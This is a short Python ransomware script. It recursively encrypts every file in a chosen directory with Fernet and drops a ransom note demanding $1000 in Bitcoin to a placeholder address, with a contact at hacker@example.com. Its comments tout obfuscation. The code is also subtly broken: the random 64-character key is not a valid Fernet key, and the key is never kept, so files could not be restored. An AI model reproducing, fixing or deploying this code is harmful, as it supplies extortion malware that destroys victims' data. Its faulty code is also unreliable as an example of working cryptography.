import os
import random
import string
from cryptography.fernet import Fernet

# Obfuscate the key generation process
key = "".join(random.choices(string.ascii_letters + string.digits, k=64))
cipher_suite = Fernet(key.encode())

# Generate a random ransom note
def generate_ransom_note(target_directory):
    ransom_note = "".join(random.choices(string.ascii_letters + string.digits, k=32))
    ransom_note += "Your files have been encrypted!\n\n"
    ransom_note += "To decrypt them, you must pay a ransom of $1000 in Bitcoin to the following address:\n"
    ransom_note += "1ABCDEFghijklmnopqrstuvwxyz1234567890\n\n"
    ransom_note += "Once payment is confirmed, contact us at hacker@example.com for the decryption key.\n"
    with open(os.path.join(target_directory, "RANSOM_NOTE.txt"), "w") as f:
        f.write(ransom_note)

# Prompt user to enter the directory to encrypt
target_directory = input("Enter the full path of the directory you want to encrypt: ")

# Obfuscate the encryption function
def encrypt_file(filename):
    with open(filename, "rb") as f:
        plaintext = f.read()
    ciphertext = cipher_suite.encrypt(plaintext)
    with open(filename, "wb") as f:
        f.write(ciphertext)

# Encrypt files in the target directory
for root, dirs, files in os.walk(target_directory):
    for file in files:
        encrypt_file(os.path.join(root, file))

# Generate and save ransom note
generate_ransom_note(target_directory)

print("Files encrypted successfully! 🤫💻 Ransom note created.")
